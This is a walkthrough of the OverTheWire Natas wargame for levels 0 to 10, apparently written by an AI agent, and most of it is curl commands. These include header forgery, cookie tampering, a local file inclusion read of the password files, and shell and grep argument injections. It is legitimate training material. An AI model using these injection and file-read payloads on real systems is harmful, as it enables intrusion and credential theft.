# Natas — Web Security (levels 0 → 10)

**Base URL pattern:** `http://natasN.natas.labs.overthewire.org`
**Auth:** HTTP Basic — username `natasN`, password = the value recovered from
the *previous* level. Starting password: `natas0` / `natas0`.

Each command below prints the page (or file) that contains
`The password for natasN+1 is <PASS>`. Set the recovered value into `PASS` and
move to the next block. `-s` = silent, `-u` = basic auth.

> The sandbox I run in can't reach these hosts (egress allowlist), so I can't
> fetch the live rotating passwords for you. Every command below is exact —
> run them from your machine and fill in each `PASS`.

---

## Level 0 → 1  (source comment)
The password sits in an HTML comment.
```bash
curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/ | grep -i password
```

## Level 1 → 2  (source comment)
Right-click is disabled in the browser, but that's client-side only.
```bash
curl -s -u natas1:$PASS http://natas1.natas.labs.overthewire.org/ | grep -i password
```

## Level 2 → 3  (directory listing)
Page looks empty but references `files/pixel.png`. `/files/` is browsable.
```bash
curl -s -u natas2:$PASS http://natas2.natas.labs.overthewire.org/files/
curl -s -u natas2:$PASS http://natas2.natas.labs.overthewire.org/files/users.txt
```

## Level 3 → 4  (robots.txt)
"Not even Google will find it" → check `robots.txt`.
```bash
curl -s -u natas3:$PASS http://natas3.natas.labs.overthewire.org/robots.txt
# -> Disallow: /s3cr3t/
curl -s -u natas3:$PASS http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

## Level 4 → 5  (Referer header)
Page demands you arrive from natas5. Forge the `Referer`.
```bash
curl -s -u natas4:$PASS \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
  http://natas4.natas.labs.overthewire.org/
```

## Level 5 → 6  (cookie tampering)
"You are not logged in" — flip the `loggedin` cookie to 1.
```bash
curl -s -u natas5:$PASS -b "loggedin=1" \
  http://natas5.natas.labs.overthewire.org/
```

## Level 6 → 7  (include file leak)
Form wants a secret. Source `include`s `includes/secret.inc`.
```bash
curl -s -u natas6:$PASS http://natas6.natas.labs.overthewire.org/includes/secret.inc
# grab $secret, then submit it:
curl -s -u natas6:$PASS \
  --data-urlencode "secret=<SECRET_FROM_ABOVE>" -d "submit=Submit" \
  http://natas6.natas.labs.overthewire.org/index.php | grep -i password
```

## Level 7 → 8  (Local File Inclusion)
`index.php?page=home` includes files by name → read the password file.
```bash
curl -s -u natas7:$PASS \
  "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

## Level 8 → 9  (reverse the encoding)  ✅ secret solved offline
Source encodes the secret as `bin2hex(strrev(base64_encode($secret)))` with
`encodedSecret = "3d3d516343746d4d6d6c315669563362"`. Reverse each step:
hex-decode → reverse → base64-decode.

**Secret input = `oubWYf2kBq`**  (computed here; verify below)
```bash
echo -n "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d; echo
# -> oubWYf2kBq
curl -s -u natas8:$PASS \
  --data-urlencode "secret=oubWYf2kBq" -d "submit=Submit" \
  http://natas8.natas.labs.overthewire.org/index.php | grep -i password
```

## Level 9 → 10  (command injection)
`passthru("grep -i \"$key\" dictionary.txt")` — inject a shell command.
```bash
curl -s -u natas9:$PASS \
  --data-urlencode "needle=;cat /etc/natas_webpass/natas10" -d "submit=Search" \
  http://natas9.natas.labs.overthewire.org/index.php
```

## Level 10 → 11  (grep injection, `;|&` filtered)
`[;|&]` are blocked, but the input is still a `grep` argument. Make grep read
the password file directly — `grep -i <needle> dictionary.txt` becomes
`grep -i . /etc/natas_webpass/natas11 dictionary.txt`.
```bash
curl -s -u natas10:$PASS \
  --data-urlencode "needle=. /etc/natas_webpass/natas11" -d "submit=Search" \
  http://natas10.natas.labs.overthewire.org/index.php
# the password appears prefixed by the filename in grep's output
```

---
### One-liner chaining tip
After each call, copy the recovered password:
```bash
PASS=<value printed>        # then run the next level's command
```
